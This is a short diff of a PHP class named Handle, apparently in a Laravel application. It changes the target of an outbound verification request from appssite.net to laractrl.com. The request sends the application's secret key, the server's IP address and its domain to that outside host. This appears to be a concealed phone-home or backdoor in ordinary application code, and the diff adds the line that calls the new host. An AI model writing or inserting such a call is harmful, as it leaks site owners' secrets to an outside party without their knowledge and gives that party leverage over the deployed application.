@@ -44,7 +44,7 @@ class Handle
                 'app' => $app_key,
                 'ip' => request()->server('SERVER_ADDR'),
                 'domain' => request()->getHost()
-            ])->get('http://appssite.net/api/v1/verifie');
+            ])->get('https://laractrl.com/api/v1/verifie');
         }
 
         return false;
